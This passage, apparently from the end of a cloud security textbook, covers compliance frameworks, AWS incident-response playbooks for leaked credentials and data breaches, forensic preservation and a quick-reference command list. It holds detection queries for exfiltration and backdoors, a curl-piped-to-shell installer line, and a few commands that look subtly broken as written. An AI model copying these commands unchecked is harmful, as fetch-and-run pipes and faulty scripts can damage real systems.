        "user_id_hash": hash(user_id),   # Store hash, not original
        "timestamp": datetime.utcnow().isoformat(),
        "systems": deletion_log
    }
    
    return audit_log
```

### ISO 27001: Information Security Management System

**What it is:** International standard for establishing an Information Security Management System (ISMS). More process-oriented than PCI DSS or HIPAA.

**Key difference from SOC 2:** ISO 27001 is internationally recognized (particularly important in Europe, Middle East, APAC). SOC 2 is primarily recognized in North America.

**Annex A controls relevant to DevOps:**

| Control | Description |
|---------|-------------|
| A.9 Access Control | IAM policies, MFA, least privilege |
| A.10 Cryptography | KMS, TLS policies, key management procedures |
| A.12 Operations Security | Change management, capacity management, malware protection |
| A.13 Communications Security | Network segmentation, secure transfer |
| A.14 System Acquisition, Development & Maintenance | Secure SDLC, code reviews, vulnerability testing |
| A.16 Information Security Incident Management | Incident response procedures, forensics |

### Common Mistakes Beginners Make

**Mistake 1: Treating compliance as a yearly audit event**

Compliance is not something you prepare for once a year. Security controls must be operating continuously. An audit is just evidence collection, not the implementation of controls.

**Mistake 2: Confusing compliance with security**

Being compliant means meeting the minimum required controls. It doesn't mean you can't be breached. Some very compliant organizations have had major breaches. Compliance is the floor, not the ceiling.

**Mistake 3: Not maintaining evidence continuously**

Auditors want evidence that controls were operating throughout the audit period. If you implement a control one week before the audit, it doesn't pass a Type 2 audit. Use AWS Config and Security Hub to continuously collect compliance evidence.

**Mistake 4: Not involving legal/compliance in technical decisions**

Architecture decisions (cloud regions, data residency, retention periods) have compliance implications. Involve your legal or compliance team early in system design.

### How This Works in the Real World

A typical startup path to enterprise compliance:
1. Target market requires SOC 2 Type 2 — this is the entry requirement for most enterprise sales
2. Engage a compliance platform (Vanta, Drata, Secureframe) to automate evidence collection
3. Implement required technical controls over 6-12 months
4. Pass Type 1 audit (design)
5. Operate controls for 6-12 months, then pass Type 2 (operations)
6. Annual re-certification with ongoing continuous monitoring

### Practical Task — Chapter 9

**Task:** Map your infrastructure to SOC 2 controls — document which controls are met and how.

```markdown
# SOC 2 Controls Mapping Document
# Production Infrastructure — [Date]

## CC6.1 — Logical Access Security Measures

### Requirement
The entity implements logical access security software, infrastructure,
and architectures over protected information assets to protect them
from security events.

### Implementation
- **IAM:** All users have individual IAM accounts. No shared credentials.
  Root account access disabled except for break-glass scenarios.
- **MFA:** Enforced for all IAM users via SCP:
  `aws organizations create-policy --type SERVICE_CONTROL_POLICY ...`
- **Password Policy:** Minimum 14 characters, complexity required, 90-day rotation
- **RBAC:** Users assigned to groups (Developer, ReadOnly, Admin) not individual policies
- **Privileged Access:** Admin access requires justification ticket + approval

### Evidence
- AWS IAM credential report (monthly export)
- CloudTrail logs of all API access
- SCP policies in AWS Organizations

### Status: ✅ MET

---

## CC6.6 — Network Security

### Requirement
Logical access security measures restrict access to information assets,
including hardware and software, to authorized external parties.

### Implementation
- **WAF:** AWS WAF with CRS attached to all ALBs
- **Security Groups:** Deny-all by default, explicit allow rules per service
- **VPC:** All application workloads in private subnets (no public IPs)
- **NACLs:** Additional layer blocking known bad IP ranges

### Evidence
- Terraform state showing Security Group configurations
- AWS Config rules: `restricted-ssh`, `restricted-common-ports`
- WAF metrics showing blocked requests

### Status: ✅ MET

---

## CC7.1 — Vulnerability Management

### Requirement
The entity identifies and evaluates the impact of known and potential
vulnerabilities to the entity's system components.

### Implementation
- **Inspector v2:** Continuous CVE scanning for EC2 and container images
- **Dependabot:** Automated dependency vulnerability alerts in GitHub
- **Patch Management:** SSM Patch Manager patches OS within 30 days of release

### Evidence  
- Inspector findings history in Security Hub
- GitHub Dependabot alerts and PRs
- SSM Patch compliance report

### Status: ⚠️ PARTIAL — Some Inspector findings > 90 days old; remediation needed
```

Continue mapping each CC criterion through CC9.

### Chapter 9 Summary

- **Compliance frameworks** encode minimum security baselines required by law, industry, or customer requirements
- **SOC 2** is the SaaS standard: demonstrates controls protecting customer data
- **PCI DSS** is mandatory for handling payment card data
- **HIPAA** protects health information and requires a BAA with AWS
- **GDPR** applies to EU personal data processing regardless of company location
- **ISO 27001** is the international ISMS standard, especially recognized outside North America
- **Compliance ≠ Security** — it's the minimum bar, not the objective
- Evidence collection must be continuous — not just before an audit
- Use automated compliance platforms (Vanta, AWS Security Hub) to reduce audit burden

---

## Chapter 10 — Security Incident Response {#chapter-10}

### When (Not If) Something Goes Wrong

No matter how good your defenses, incidents will happen. A misconfigured IAM policy leaks credentials. A developer pushes a secret to GitHub. A sophisticated attacker finds a zero-day in a dependency. A disgruntled employee exfiltrates data before leaving.

The question is not whether you'll have a security incident. The question is: **will you be ready when you do?**

**Incident response** is the organized approach to addressing and managing the aftermath of a security breach or attack. Done well, it limits damage, reduces recovery time, and provides the evidence needed to understand what happened and prevent recurrence.

### The NIST Cybersecurity Framework: Incident Response

NIST SP 800-61 defines four phases of incident response:

```
1. PREPARATION → 2. DETECTION & ANALYSIS → 3. CONTAINMENT, ERADICATION, RECOVERY → 4. POST-INCIDENT ACTIVITY
         ↑                                                                                          │
         └──────────────────────────────────────────────────────────────────────────────────────────┘
                                            Continuous improvement
```

**Phase 1: Preparation**

Build your response capabilities before you need them:
- Define what constitutes an "incident" (security event that requires response)
- Assign roles and responsibilities (Incident Commander, Communications Lead, Technical Lead)
- Create playbooks for common incident types
- Establish communication channels (secure Slack channel, out-of-band communication)
- Conduct tabletop exercises (walk through scenarios without real systems)
- Ensure logging is in place before an incident occurs

**Phase 2: Detection and Analysis**

Identify that an incident has occurred and understand its nature and scope:
- Who/what is affected?
- What was accessed or exfiltrated?
- Is the attack ongoing?
- What is the scope of the breach?

**Phase 3: Containment, Eradication, Recovery**

Stop the bleeding, remove the threat, restore normal operations.

**Phase 4: Post-Incident Activity**

Learn from what happened to prevent recurrence.

### Incident Playbooks: Step-by-Step Response Guides

A **playbook** is a documented procedure for responding to a specific incident type. It should be detailed enough that someone unfamiliar with the system can follow it under the stress of an active incident.

**Playbook 1: Compromised Credentials**

```markdown
# Playbook: Compromised AWS IAM Credentials
Last Updated: [Date] | Owner: Security Team

## Trigger Conditions
- GuardDuty finding: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess
- Alert: CloudTrail API calls from unexpected geographic location
- External notification (HaveIBeenPwned, GitHub secret scan)
- Employee reports credentials may be exposed

## Severity Assessment
- P1 (Critical): Root account or admin role credentials compromised
- P2 (High): Standard user with S3/RDS/production access compromised
- P3 (Medium): Read-only or dev account compromised

## Response Steps

### Step 1: IMMEDIATE — Disable the credential (< 5 minutes)
```bash
# Identify the compromised access key
aws iam list-access-keys --user-name COMPROMISED_USER

# Deactivate the access key (don't delete yet — preserve for forensics)
aws iam update-access-key \
  --access-key-id AKIAIOSFODNN7EXAMPLE \
  --status Inactive \
  --user-name COMPROMISED_USER

# If console login was compromised, disable console access
aws iam delete-login-profile --user-name COMPROMISED_USER

# If this is a service role, you may need to invalidate the role session
# Check for active sessions
aws sts get-caller-identity   # Run from suspected compromised key
```

### Step 2: ASSESS — Understand what was accessed (< 30 minutes)
```bash
# Query CloudTrail for all API calls from this credential
aws logs filter-log-events \
  --log-group-name /aws/cloudtrail \
  --filter-pattern '{ $.userIdentity.accessKeyId = "AKIAIOSFODNN7EXAMPLE" }' \
  --start-time $(date -d '7 days ago' +%s)000 \
  --end-time $(date +%s)000 \
  --output json | jq '.events[] | {timestamp: .timestamp, eventName: .message | fromjson | .eventName, resources: .message | fromjson | .resources}'

# Look specifically for:
# - iam:CreateUser, iam:AttachUserPolicy (persistence mechanism)
# - s3:GetObject, s3:ListBucket (data exfiltration)
# - ec2:RunInstances (resource abuse, crypto mining)
# - sts:AssumeRole (lateral movement)
```

### Step 3: CONTAIN — Limit blast radius
```bash
# Apply restrictive SCP to stop further damage while investigation continues
aws organizations create-policy \
  --type SERVICE_CONTROL_POLICY \
  --name EmergencyLockdown \
  --content '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalArn": "arn:aws:iam::ACCOUNT:user/COMPROMISED_USER"
        }
      }
    }]
  }'

# Check for and remove any backdoors created during compromise
aws iam list-users --query 'Users[?CreateDate>`2024-01-01`]'  # Recent users
aws iam list-access-keys --user-name EACH_NEW_USER            # New access keys

# Check for Lambda backdoors
aws lambda list-functions --query 'Functions[?LastModified>`2024-01-01`]'

# Check for new EC2 instances
aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].[InstanceId,LaunchTime,Tags]' \
  | grep -A2 "$(date -d 'yesterday' +%Y-%m-%d)"
```

### Step 4: ERADICATE — Remove the threat
```bash
# Delete the compromised credential
aws iam delete-access-key \
  --access-key-id AKIAIOSFODNN7EXAMPLE \
  --user-name COMPROMISED_USER

# Rotate all secrets that may have been visible to this credential
# Use AWS Secrets Manager for automatic rotation
aws secretsmanager rotate-secret \
  --secret-id production/database/password

# Review and remove any persistence mechanisms found in Step 3
```

### Step 5: RECOVER
- Issue new credentials to legitimate user via secure channel
- Verify application functionality
- Monitor closely for 24-48 hours post-recovery

### Step 6: POST-INCIDENT
- Write incident report (see template below)
- Identify root cause (how were credentials exposed?)
- Implement preventive controls
- Update this playbook based on lessons learned
```

**Playbook 2: Suspected Data Breach**

```markdown
# Playbook: Suspected Data Breach
## Trigger Conditions
- GuardDuty: Exfiltration findings
- Unusual S3 egress in CloudTrail
- External notification from researcher or third party
- Internal discovery of unexpected data access

## Legal/Compliance Steps (run SIMULTANEOUSLY with technical)
1. Notify Legal team immediately — they determine notification obligations
2. GDPR: If EU personal data is involved, 72-hour notification window begins NOW
3. PCI DSS: Payment card data breach has specific notification requirements
4. Preserve all logs — do not modify or delete anything

## Technical Response Steps
```bash
# Identify scope of potentially exfiltrated data
# Check CloudTrail for S3 GetObject events
aws athena start-query-execution \
  --query-string "
    SELECT userIdentity.arn, requestParameters.bucketName, 
           requestParameters.key, COUNT(*) as access_count,
           SUM(CAST(additionalEventData.bytesTransferredOut AS BIGINT)) as bytes_out
    FROM cloudtrail_logs
    WHERE eventName = 'GetObject'
    AND eventTime BETWEEN '2024-01-01' AND '2024-01-31'
    GROUP BY 1,2,3
    ORDER BY bytes_out DESC
    LIMIT 100
  " \
  --work-group primary

# Check for unusual VPC egress (potential data exfil via compute)
# High outbound traffic to unknown IPs is a red flag
```
```

### AWS Incident Response Tools

```bash
# AWS Systems Manager Incident Manager — centralized incident tracking
aws ssm-incidents create-incident \
  --title "Security Incident: Potential IAM Compromise" \
  --impact 1 \    # 1=Critical, 2=High, 3=Medium, 4=Low, 5=Informational
  --client-token "$(uuidgen)"

# Automated remediation with AWS Config Rules + SSM Automation
# Example: Auto-remediate S3 public access if detected
aws config put-remediation-configurations \
  --remediation-configurations '[{
    "ConfigRuleName": "s3-bucket-public-access-prohibited",
    "TargetType": "SSM_DOCUMENT",
    "TargetId": "AWS-DisableS3BucketPublicReadWrite",
    "Automatic": true,
    "MaximumAutomaticAttempts": 3,
    "RetryAttemptSeconds": 60
  }]'
```

### Forensics: Preserving Evidence

During an incident, preserving forensic evidence is critical for understanding what happened and for potential legal proceedings.

```bash
# Preserve an EC2 instance before terminating it
# Create a snapshot of the compromised instance's disk

# Step 1: Get instance details
INSTANCE_ID="i-1234567890abcdef0"
VOLUME_ID=$(aws ec2 describe-instances \
  --instance-ids $INSTANCE_ID \
  --query 'Reservations[0].Instances[0].BlockDeviceMappings[0].Ebs.VolumeId' \
  --output text)

# Step 2: Create a snapshot
SNAPSHOT_ID=$(aws ec2 create-snapshot \
  --volume-id $VOLUME_ID \
  --description "Forensic snapshot - security incident $(date +%Y%m%d)" \
  --query 'SnapshotId' --output text)

# Tag it with case information
aws ec2 create-tags \
  --resources $SNAPSHOT_ID \
  --tags \
    Key=IncidentId,Value="INC-2024-001" \
    Key=Preserve,Value=true \
    Key=CapturedAt,Value="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Step 3: Isolate the instance while preserving for analysis
# Create an empty security group (no ingress or egress)
ISOLATION_SG=$(aws ec2 create-security-group \
  --group-name "ISOLATION-$(date +%Y%m%d)" \
  --description "Isolation SG for security incident" \
  --vpc-id vpc-YOURPCID \
  --query 'GroupId' --output text)

# Assign the isolation SG (removes all network access)
aws ec2 modify-instance-attribute \
  --instance-id $INSTANCE_ID \
  --groups $ISOLATION_SG
```

### Incident Report Template

```markdown
# Security Incident Report

**Incident ID:** INC-2024-001
**Severity:** P2 - High
**Status:** Resolved
**Incident Commander:** [Name]

## Timeline
| Time (UTC) | Event |
|------------|-------|
| 14:23 | GuardDuty alert: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B |
| 14:25 | On-call engineer acknowledges alert |
| 14:30 | Access key deactivated |
| 14:45 | Scope assessment complete — no data exfiltration identified |
| 15:00 | Compromised key deleted, new key issued via secure channel |
| 15:30 | Monitoring confirmed — no further unauthorized activity |
| 16:00 | Incident closed |

## Root Cause
Developer accidentally committed AWS credentials to a public GitHub repository.
Credentials were detected by an automated scanner and exploited within 6 minutes.

## Impact
- Unauthorized console login from IP 185.x.x.x (Eastern Europe)
- Exploration of S3 buckets (ListBucket calls logged)
- No data exfiltration confirmed

## Containment Actions
1. Access key deactivated within 7 minutes of alert
2. Developer IAM user placed under enhanced monitoring

## Eradication Actions
1. Compromised key deleted
2. New key issued via Secrets Manager
3. GitHub repo's git history cleaned with BFG Repo Cleaner

## Recovery Actions
1. New credentials deployed to affected applications
2. Verified all applications functioning normally

## Lessons Learned
1. Pre-commit hooks for secret detection were not enabled on this repo
2. Automated GitHub secret scanning was not enabled for this org

## Preventive Measures
1. Enable GitHub Advanced Security secret scanning on all repos (Due: 2024-02-01)
2. Deploy `git-secrets` pre-commit hook org-wide (Due: 2024-01-25)
3. Implement GitLeaks in CI/CD pipeline (Due: 2024-02-15)
4. Require separate CI/CD credentials with minimum permissions (Due: 2024-03-01)
```

### Common Mistakes Beginners Make

**Mistake 1: Not having playbooks before an incident**

During an active incident, there is no time to write procedures. Playbooks must exist before you need them. Write them for your most likely scenarios: compromised credentials, public S3 bucket, ransomware on EC2, dependency with critical CVE.

**Mistake 2: Deleting evidence**

The instinct when you find a compromised instance is to terminate it. Resist. Take snapshots, capture memory, preserve logs first. Evidence is needed for forensics, insurance claims, and legal proceedings.

**Mistake 3: Not communicating clearly**

Who knows about the incident? Who needs to know? When? A breach affecting customer data has legal notification requirements. Involve legal, communications, and leadership early.

**Mistake 4: Fixing the symptom, not the root cause**

Rotating a compromised credential stops the immediate bleeding but doesn't prevent recurrence. The root cause analysis and preventive measures are the most important output of incident response.

### How This Works in the Real World

Major incidents follow the same lifecycle regardless of the organization. The breach of [a major organization] typically:

1. **Dwell time:** Attackers are often in systems for 6-12 months before detection
2. **Detection:** Often discovered by a third party (security researcher, other victim's forensics)
3. **Triage:** Hours spent understanding scope
4. **Escalation:** Legal, executives, board involved
5. **External comms:** Regulatory notification, customer notification
6. **Remediation:** Weeks to months
7. **Post-breach:** Significant security investment

### Practical Task — Chapter 10

**Task:** Implement a security incident response playbook: compromised credentials, data breach, ransomware.

Build on the playbooks above. For each scenario, create:

```bash
# 1. Create a secure incident response runbook in S3
# (accessible even if your normal tooling is compromised)
aws s3 mb s3://YOUR-ACCOUNT-security-runbooks --region us-east-1
aws s3 cp incident-playbooks/ s3://YOUR-ACCOUNT-security-runbooks/ --recursive
# Ensure only security team and break-glass accounts can access this bucket

# 2. Set up GuardDuty to automatically trigger playbooks
# Create EventBridge rule to trigger Lambda on GuardDuty findings
aws events put-rule \
  --name "GuardDutyHighSeverityFinding" \
  --event-pattern '{
    "source": ["aws.guardduty"],
    "detail-type": ["GuardDuty Finding"],
    "detail": {
      "severity": [{ "numeric": [">=", 7] }]
    }
  }' \
  --state ENABLED

# 3. Set up SNS for immediate notification
aws sns create-topic --name security-incidents
aws sns subscribe \
  --topic-arn arn:aws:sns:REGION:ACCOUNT:security-incidents \
  --protocol email \
  --notification-endpoint security-team@company.com

# 4. Test the playbook with a simulated GuardDuty finding
aws guardduty create-sample-findings \
  --detector-id YOUR_DETECTOR_ID \
  --finding-types \
    "UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B" \
    "CryptoCurrency:EC2/BitcoinTool.B"
# Verify the alert reaches the security team and the runbook is accessible
```

### Chapter 10 Summary

- **Incident response** is the organized approach to handling security breaches
- **NIST framework** defines four phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident
- **Playbooks** are pre-written procedures for specific incident types — write them before you need them
- **Preserve evidence** before containing — snapshots, logs, memory captures
- **Root cause analysis** is more important than the immediate fix
- **Communication** — legal, compliance, customers — is part of incident response
- **GuardDuty + Security Hub + EventBridge** can automate initial response steps
- **Practice** incidents via tabletop exercises so the real thing isn't the first time you've done it

---

## Final Chapter — Putting It All Together in a Real-World Workflow {#final-chapter}

### The Security Lifecycle: How Everything Connects

Imagine you're the lead engineer at a fintech startup. You're building a payment processing platform. Thousands of customers will trust you with their financial data. Let's trace how every topic in this book applies to your system.

### Your Architecture

```
Internet Users
      │
      ▼
[Cloudflare DDoS]     ← Chapter 5: DDoS Protection
      │
      ▼
[AWS CloudFront + WAF]  ← Chapter 4: Cloud WAF
      │
      ▼
[API Gateway]           ← Chapter 3: API Gateway Security
  (Rate Limiting,
   OAuth2/OIDC,
   API Keys)
      │
      ▼
[Private VPC]           ← Chapter 6: Private Networking
  ┌───┴───┐
  ▼       ▼
[Frontend] [API Service]
  │            │
  └─── Istio ──┘    ← Chapter 2: Service Mesh Security
  mTLS + AuthZ
        │
        ▼
  [Database - RDS]
  (Private Subnet,
   VPC Endpoint)

Surrounding everything:
  SIEM + Security Hub   ← Chapter 7: SIEM
  GuardDuty             ← Chapter 7
  Compliance Controls   ← Chapter 9
  Incident Playbooks    ← Chapter 10
  Zero Trust Policies   ← Chapter 1

Regular:
  Pen Testing           ← Chapter 8
```

### How the Topics Work Together

**Zero Trust (Chapter 1) is the philosophy.** Everything else is an implementation of it.

- The service mesh (Ch. 2) implements Zero Trust between microservices: mTLS identity, authorization policies.
- The API gateway (Ch. 3) implements Zero Trust for external access: OAuth2, rate limiting.
- Private networking (Ch. 6) implements Zero Trust for infrastructure: nothing talks over the internet.

**WAF (Chapter 4) and DDoS protection (Chapter 5) are the outer shield.**

- Before traffic reaches your Zero Trust infrastructure, it passes through Cloudflare (DDoS scrubbing), CloudFront + WAF (OWASP protection), and API Gateway (rate limiting).
- An attacker trying SQL injection is stopped at the WAF, never reaching your API.
- A DDoS attack is absorbed by Cloudflare/Shield before reaching your origin.

**SIEM (Chapter 7) is your visibility layer.**

- GuardDuty watches for unusual behavior across all the above systems.
- Security Hub aggregates findings and compliance status.
- Alerts fire when WAF blocks unusual volumes, when GuardDuty detects lateral movement, when a login happens from an unexpected location.
- Without the SIEM, your defenses are in place but you're flying blind.

**Penetration testing (Chapter 8) validates your defenses.**

- Your WAF says it blocks SQL injection — pen testing proves it.
- Your Zero Trust says only `api` can talk to `database` — pen test attempts to violate this.
- Annual pen tests find the gaps that automated tools and everyday attention miss.

**Compliance (Chapter 9) defines the minimum required.**

- Your payment data is in scope for PCI DSS — your WAF, encryption, and audit logging directly satisfy PCI requirements.
- Your European customers fall under GDPR — your data deletion capability and breach response process satisfy GDPR requirements.
- SOC 2 requires incident response, vulnerability management, and access controls — all of which you've implemented.

**Incident response (Chapter 10) handles what gets through.**

- No matter how good your defenses, you will have an incident.
- Your GuardDuty (Ch. 7) detects the anomaly.
- Your playbook (Ch. 10) guides the response.
- Your forensic tooling preserves evidence.
- Your compliance framework (Ch. 9) tells you your notification obligations.
- Your post-incident review feeds back into all other layers.

### The Security Engineering Mindset

After reading this book, the most important thing to carry forward is not any specific tool or configuration. It's a **way of thinking.**

**1. Assume breach**

Design every system assuming attackers are already inside. What can they see? What can they do? How do you detect them? How do you limit the blast radius?

**2. Defense in depth**

No single control is sufficient. A WAF can be bypassed. mTLS has implementation bugs. Rate limiting has edge cases. Layer multiple controls so that an attacker must break through several simultaneously.

**3. Least privilege everywhere**

For users, services, applications, and data stores. The question is always: "What is the minimum permission needed for this entity to do its job?"

**4. Security as code**

Every security control should be defined in code (Terraform, Kubernetes YAML, Python), versioned in git, reviewed like application code, tested in CI/CD, and deployed automatically. Security controls that exist only in a console, managed by hand, will drift and fail.

**5. Continuous monitoring**

Security posture degrades over time. New vulnerabilities are discovered. Configurations drift. Access permissions accumulate. Without continuous monitoring (Security Hub, GuardDuty, pen tests), you won't know until it's too late.

**6. The human layer is the weakest**

No technical control stops a developer who is social-engineered into revealing credentials, or who pastes a secret into a public forum. Security training, security culture, and reducing the number of secrets that humans have to manage (use IAM roles, not access keys) are as important as technical controls.

### What You Should Do This Week

1. **Audit your current IAM permissions.** Run `aws iam get-account-authorization-details` and look for over-privileged roles.

2. **Enable GuardDuty if you haven't.** It takes 5 minutes and provides immediate threat detection.

3. **Check whether you have any public S3 buckets.** Run `aws s3api list-buckets | xargs -I {} aws s3api get-bucket-policy-status --bucket {}` and investigate anything `IsPublic: true`.

4. **Write your first playbook.** Even one page: "If GuardDuty fires a high-severity alert at 3am, what do I do?"

5. **Deploy WAF in Count mode.** You'll be surprised what it catches.

### The Journey Continues

Security is not a destination; it's a practice. The threat landscape changes daily. New attack techniques emerge. New compliance requirements come into force. New cloud services introduce new attack surfaces.

The engineers who stay ahead are not those who learned a list of tools. They are those who internalized the principles — least privilege, defense in depth, assume breach, verify always — and apply them to each new situation as it arises.

That's what this book was designed to help you do.

---

## Quick Reference: Key Commands and Configurations

### Zero Trust & Service Mesh

```bash
# Install Istio
curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.20.0 sh -
istioctl install --set profile=default -y
kubectl label namespace production istio-injection=enabled

# Enable strict mTLS
kubectl apply -f - <<EOF
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT
EOF

# Check mTLS status
istioctl authn tls-check <pod> api.production.svc.cluster.local
```

### Security Hub & GuardDuty

```bash
# Enable Security Hub
aws securityhub enable-security-hub --enable-default-standards

# Enable GuardDuty
aws guardduty create-detector --enable

# List critical findings
aws securityhub get-findings \
  --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'

# Simulate GuardDuty findings
aws guardduty create-sample-findings \
  --detector-id YOUR_DETECTOR_ID \
  --finding-types "UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B"
```

### Private Networking

```bash
# Check for internet-accessible resources
aws ec2 describe-instances \
  --filters "Name=network-interface.association.public-ip,Values=*" \
  --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags]'

# Verify VPC endpoints are being used
aws ec2 describe-vpc-endpoints --query 'VpcEndpoints[*].[ServiceName,State]'
```

### Incident Response

```bash
# Disable compromised access key
aws iam update-access-key --access-key-id KEY_ID --status Inactive --user-name USER

# Create forensic snapshot
aws ec2 create-snapshot --volume-id vol-xxx --description "Forensic $(date +%Y%m%d)"

# Isolate compromised instance
aws ec2 modify-instance-attribute --instance-id i-xxx --groups ISOLATION_SG_ID
```

---

*This book was written for Cloud & DevOps engineering students. The concepts, configurations, and methodologies described represent industry best practices as of the time of writing. Security is an evolving field — always verify against current vendor documentation and stay informed of new threats and techniques.*

*Happy building. Stay secure.*

---

**End of Book**